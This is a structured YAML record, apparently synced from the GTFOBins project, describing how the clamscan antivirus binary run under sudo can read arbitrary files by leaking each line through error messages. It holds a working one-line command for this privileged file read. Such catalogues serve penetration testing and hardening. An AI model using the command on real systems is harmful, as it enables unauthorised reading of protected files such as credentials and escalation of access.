id: gtfobins/clamscan/file-read/sudo
type: binary
platform: linux
name: clamscan
phases:
- collection
- privilege-escalation
capabilities:
- file-read
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: GPL-3.0
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'touch x.yara

    clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE ''s/^(.*): No such file or directory$/\1/p'''
  comment: Each line of the file is interpreted as a path and the content is leaked via error messages.
    The output can optionally be cleaned using `sed`.
references:
- https://gtfobins.github.io/gtfobins/clamscan/
tags:
- linux
- unix
- gtfobins
